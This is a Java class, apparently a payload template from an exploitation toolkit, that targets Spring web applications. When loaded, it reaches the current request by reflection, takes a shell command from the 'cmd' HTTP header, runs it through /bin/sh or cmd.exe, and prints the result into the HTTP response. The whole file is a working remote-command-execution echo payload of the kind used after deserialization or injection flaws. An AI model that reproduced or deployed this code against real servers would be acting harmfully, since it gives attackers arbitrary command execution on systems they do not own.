package dev.silente.javashark.template.echo;

import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringEcho {
    public SpringEcho() {
        try {
            Method m = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder").getMethod("getRequestAttributes", new Class[0]);
            Object o = m.invoke(null, new Object[0]);
            Class c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            Method m2 = c.getMethod("getResponse", new Class[0]);
            Method m1 = c.getMethod("getRequest", new Class[0]);
            Object resp = m2.invoke(o, new Object[0]);
            Object req = m1.invoke(o, new Object[0]);
            Method getWriter = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter", new Class[0]);
            Method getHeader = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader", String.class);
            getHeader.setAccessible(true);
            getWriter.setAccessible(true);
            Object writer = getWriter.invoke(resp, new Object[0]);
            String cmd = (String) getHeader.invoke(req, "cmd");
            String[] commands = new String[3];
            String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK" : "UTF-8";
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                commands[0] = "cmd";
                commands[1] = "/c";
            } else {
                commands[0] = "/bin/sh";
                commands[1] = "-c";
            }
            commands[2] = cmd;
            writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter("\\A").next());
            writer.getClass().getDeclaredMethod("flush", new Class[0]).invoke(writer, new Object[0]);
            writer.getClass().getDeclaredMethod("close", new Class[0]).invoke(writer, new Object[0]);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}